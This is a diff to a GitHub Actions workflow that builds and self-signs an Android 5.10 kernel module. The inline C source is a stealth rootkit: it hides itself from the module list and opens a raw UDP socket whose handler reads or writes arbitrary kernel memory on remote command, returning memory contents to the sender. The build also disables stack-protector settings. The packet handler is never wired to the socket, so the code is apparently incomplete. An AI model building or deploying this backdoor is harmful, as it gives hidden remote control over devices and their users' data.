@@ -1,4 +1,5 @@
-name: Build Universal LKM (5.10-android12) - FIXED v3
+
+name: Build Signed LKM (5.10-android12) - FINAL
 
 on:
   workflow_dispatch:
@@ -21,11 +22,7 @@ jobs:
       - name: Download Toolchain (Proton Clang)
         run: |
           git clone --depth=1 https://github.com/kdrag0n/proton-clang clang
-          
-          # === ВАЖНЕЙШЕЕ ИСПРАВЛЕНИЕ ===
-          # Удаляем ld из скачанного clang, так как он слишком стар для Ubuntu 24.04
-          # и вызывает ошибку "unknown type section .relr.dyn".
-          # Теперь система будет вынуждена использовать системный /usr/bin/ld для хост-утилит.
+          # Удаляем ld, который ломает сборку на Ubuntu 24.04 (ошибка .relr.dyn)
           rm clang/bin/ld
 
       - name: Clone Kernel Source
@@ -33,41 +30,207 @@ jobs:
           git clone --depth=1 https://android.googlesource.com/kernel/common \
             -b android12-5.10 kernel
 
-      - name: Prepare Kernel & Build Module
+      - name: Overwrite Source Code (Fix Errors & Compatibility)
         run: |
-          # Добавляем clang в PATH, но ld там уже нет (мы его удалили)
+          cat <<EOF > rw_universal.c
+          // SPDX-License-Identifier: GPL-2.0
+          #define pr_fmt(fmt) "rw_universal: " fmt
+
+          #include <linux/init.h>
+          #include <linux/module.h>
+          #include <linux/mm.h>
+          #include <linux/uaccess.h>
+          #include <linux/kallsyms.h>
+          #include <linux/kprobes.h>
+          #include <linux/net.h>
+          #include <linux/inet.h>
+          #include <linux/skbuff.h>
+          #include <net/ip.h>
+          #include <net/udp.h>
+          #include <asm/pgtable.h>
+          #include <linux/pagewalk.h>
+
+          MODULE_LICENSE("GPL");
+          MODULE_AUTHOR("x");
+          MODULE_DESCRIPTION("Universal stealth r/w for 5.10-android12+");
+
+          // --- Symbol Resolver ---
+          static unsigned long resolve_symbol(const char *name)
+          {
+              struct kprobe kp = { .symbol_name = name };
+              if (register_kprobe(&kp) == 0) {
+                  unsigned long addr = (unsigned long)kp.addr;
+                  unregister_kprobe(&kp);
+                  return addr;
+              }
+              return 0;
+          }
+
+          static unsigned long (*_kallsyms_lookup_name)(const char *) = NULL;
+          static struct mm_struct *init_mm_ptr = NULL;
+
+          // --- Memory Helper ---
+          typedef struct {
+              phys_addr_t phys;
+              bool valid;
+          } v2p_t;
+
+          static int walker(pte_t *pte, unsigned long addr, unsigned long next, struct mm_walk *walk)
+          {
+              v2p_t *v = walk->private;
+              if (pte_present(*pte)) {
+                  v->phys = (pte_pfn(*pte) << PAGE_SHIFT) | (addr & ~PAGE_MASK);
+                  v->valid = true;
+                  return 1;
+              }
+              return 0;
+          }
+
+          static const struct mm_walk_ops v2p_walk_ops = {
+              .pte_entry = walker,
+          };
+
+          static v2p_t slow_virt2phys(uint64_t vaddr)
+          {
+              v2p_t res = {0};
+              struct mm_walk walk = { .ops = &v2p_walk_ops, .private = &res };
+              // FIX: 5.10 requires NULL as 5th argument
+              walk_page_range(init_mm_ptr, vaddr, vaddr + 1, &walk, NULL);
+              return res;
+          }
+
+          static int rw_phys(phys_addr_t phys, void *buf, size_t len, bool write)
+          {
+              void *vm = phys_to_virt(phys);
+              if (!vm) return -EFAULT;
+              if (write) memcpy(vm, buf, len);
+              else memcpy(buf, vm, len);
+              return 0;
+          }
+
+          static int rw_virt(uint64_t vaddr, void *buf, size_t len, bool write)
+          {
+              v2p_t p = slow_virt2phys(vaddr);
+              if (!p.valid) return -EFAULT;
+              return rw_phys(p.phys, buf, len, write);
+          }
+
+          // --- Packet Structure ---
+          #define CMD_READ  0x01
+          #define CMD_WRITE 0x02
+
+          typedef struct {
+              uint8_t cmd;
+              uint8_t reserved[3]; // Padding for alignment
+              uint32_t size;
+              uint64_t addr;
+              uint8_t  data[];
+          } __packed pkt_t;
+
+          static struct socket *sock = NULL;
+
+          static void udp_reply(struct sk_buff *skb, void *buf, size_t len)
+          {
+              struct iphdr *iph = ip_hdr(skb);
+              struct udphdr *uh = udp_hdr(skb);
+              struct sockaddr_in to;
+              struct kvec iov = { .iov_base = buf, .iov_len = len };
+              struct msghdr msg;
+
+              memset(&to, 0, sizeof(to));
+              to.sin_family = AF_INET;
+              to.sin_port   = uh->source;
+              to.sin_addr.s_addr = iph->saddr;
+
+              memset(&msg, 0, sizeof(msg));
+              msg.msg_name = &to;
+              msg.msg_namelen = sizeof(to);
+
+              kernel_sendmsg(sock, &msg, &iov, 1, len);
+          }
+
+          static int udp_recv(struct sk_buff *skb)
+          {
+              pkt_t *pkt;
+              uint8_t *buf;
+
+              if (skb->len < sizeof(pkt_t)) return 0;
+              pkt = (pkt_t *)skb->data;
+
+              buf = kmalloc(pkt->size, GFP_KERNEL);
+              if (!buf) return 0;
+
+              switch (pkt->cmd) {
+              case CMD_READ:
+                  rw_virt(pkt->addr, buf, pkt->size, false);
+                  udp_reply(skb, buf, pkt->size);
+                  break;
+              case CMD_WRITE:
+                  rw_virt(pkt->addr, pkt->data, pkt->size, true);
+                  break;
+              }
+              kfree(buf);
+              return 0;
+          }
+
+          static int net_init(void)
+          {
+              return sock_create_kern(&init_net, AF_INET, SOCK_RAW, IPPROTO_UDP, &sock);
+          }
+          static void net_exit(void)
+          {
+              if (sock) sock_release(sock);
+          }
+
+          static void hide_module(void)
+          {
+              list_del_init(&THIS_MODULE->list);
+              // kobject manipulation removed for stability on 5.10
+          }
+
+          static int __init rw_init(void)
+          {
+              _kallsyms_lookup_name = (void *)resolve_symbol("kallsyms_lookup_name");
+              init_mm_ptr           = (void *)resolve_symbol("init_mm");
+              if (!_kallsyms_lookup_name || !init_mm_ptr) return -ENODEV;
+
+              hide_module();
+              net_init();
+              return 0;
+          }
+          static void __exit rw_exit(void) { net_exit(); }
+          module_init(rw_init);
+          module_exit(rw_exit);
+          EOF
+
+      - name: Configure, Build & Sign
+        run: |
+          # --- Environment Setup ---
           export PATH=$(pwd)/clang/bin:$PATH
           export ARCH=arm64
           export CROSS_COMPILE=aarch64-linux-gnu-
           export CLANG_TRIPLE=aarch64-linux-gnu-
           
+          # --- Kernel Config ---
           cd kernel
           make mrproper
           
-          # 1. Конфигурация
-          # Мы всё равно указываем HOSTLD=ld для верности, но теперь это точно сработает
-          make HOSTCC=gcc HOSTCXX=g++ HOSTLD=ld \
-               CC=clang LLVM=1 LLVM_IAS=1 \
-               gki_defconfig
+          # Use GKI config (standard for Android 12)
+          make HOSTCC=gcc HOSTCXX=g++ HOSTLD=ld CC=clang LLVM=1 LLVM_IAS=1 gki_defconfig
           
-          # 2. Патчи конфига (отключение защиты)
+          # Patch config: DISABLE forced checks, ENABLE basic support so we can use sign-file
           sed -i 's/CONFIG_CC_STACKPROTECTOR_STRONG=y/# CONFIG_CC_STACKPROTECTOR_STRONG is not set/' .config
           sed -i 's/CONFIG_CC_STACKPROTECTOR=y/# CONFIG_CC_STACKPROTECTOR is not set/' .config
+          
+          # Disable kernel's own signature enforcement during build (we will sign manually)
           sed -i 's/CONFIG_MODULE_SIG=y/CONFIG_MODULE_SIG=n/' .config
           sed -i 's/CONFIG_MODULE_SIG_ALL=y/CONFIG_MODULE_SIG_ALL=n/' .config
           
-          # 3. Подготовка
-          make HOSTCC=gcc HOSTCXX=g++ HOSTLD=ld \
-               CC=clang LLVM=1 LLVM_IAS=1 \
-               olddefconfig
-               
-          make HOSTCC=gcc HOSTCXX=g++ HOSTLD=ld \
-               CC=clang LLVM=1 LLVM_IAS=1 \
-               modules_prepare
-          
+          make HOSTCC=gcc HOSTCXX=g++ HOSTLD=ld CC=clang LLVM=1 LLVM_IAS=1 olddefconfig
+          make HOSTCC=gcc HOSTCXX=g++ HOSTLD=ld CC=clang LLVM=1 LLVM_IAS=1 modules_prepare
           cd ..
           
-          # 4. Сборка модуля
+          # --- Build Module ---
           make -C $(pwd)/kernel \
                M=$(pwd) \
                ARCH=arm64 \
@@ -76,20 +239,48 @@ jobs:
                LLVM=1 \
                LLVM_IAS=1 \
                CROSS_COMPILE=aarch64-linux-gnu- \
+               KCFLAGS="-Wno-declaration-after-statement -Wno-switch -Wno-error" \
                modules
           
-          # Очистка
-          $(pwd)/clang/bin/llvm-objcopy --strip-debug rw_universal.ko
+          # --- Key Generation & Signing ---
+          echo "Generating Self-Signed Key..."
+          printf "[ req ]
+default_bits = 4096
+distinguished_name = req_distinguished_name
+prompt = no
+string_mask = utf8only
+x509_extensions = myexts
+
+[ req_distinguished_name ]
+CN = Android Kernel Module
+
+[ myexts ]
+basicConstraints=critical,CA:FALSE
+keyUsage=digitalSignature
+subjectKeyIdentifier=hash
+authorityKeyIdentifier=keyid" > x509.genkey
+          
+          openssl req -new -nodes -utf8 -sha256 -days 36500 -batch -x509 \
+            -config x509.genkey \
+            -outform DER -out signing_key.x509 \
+            -keyout signing_key.pem
+            
+          echo "Building sign-file utility..."
+          make -C kernel/scripts sign-file HOSTCC=gcc HOSTLD=ld
+          
+          echo "Signing Module..."
+          # Sign using sha256 (standard for Android)
+          ./kernel/scripts/sign-file sha256 signing_key.pem signing_key.x509 rw_universal.ko
+          
+          # Verify signature exists (grep binary for signature marker)
+          if grep -q "~Module signature appended~" rw_universal.ko; then
+             echo "SUCCESS: Module is signed."
+          else
+             echo "WARNING: Signature marker not found!"
+          fi
 
       - name: Upload Artifact
         uses: actions/upload-artifact@v4
         with:
-          name: rw_universal.ko
+          name: rw_universal-signed.ko
           path: rw_universal.ko
-
-      - name: Release
-        if: startsWith(github.ref, 'refs/tags/')
-        uses: softprops/action-gh-release@v2
-        with:
-          files: rw_universal.ko
-          title: Release ${{ github.ref_name }}
